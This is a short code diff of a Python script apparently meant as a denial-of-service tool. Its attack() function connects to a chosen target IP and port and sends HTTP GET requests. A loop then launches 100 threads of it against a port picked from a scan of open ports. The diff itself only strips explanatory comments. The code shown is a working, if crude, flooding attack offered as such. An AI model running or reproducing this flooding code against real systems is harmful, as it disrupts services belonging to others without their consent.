@@ -100,9 +100,7 @@ def attack():
         x = s.socket(s.AF_INET, s.SOCK_STREAM)
         # Connect to the target
         x.connect((target_ip, target_port))
-        # Send a simple HTTP GET request
         x.sendto(b"GET / HTTP/1.1\r\nHost: target_ip\r\n\r\n", (target_ip, target_port))
-        # Close the socket
         x.close()
 
 
@@ -111,8 +109,7 @@ if open_ports:
     for p in open_ports:
         print(f" - {p}")
     target_port = int(input("What port do we choose?"))
-    # Create multiple threads to simulate multiple attackers
-    for i in range(100):  # Number of threads
+    for i in range(100):
         thread = threading.Thread(target=attack)
         thread.start()
 else:
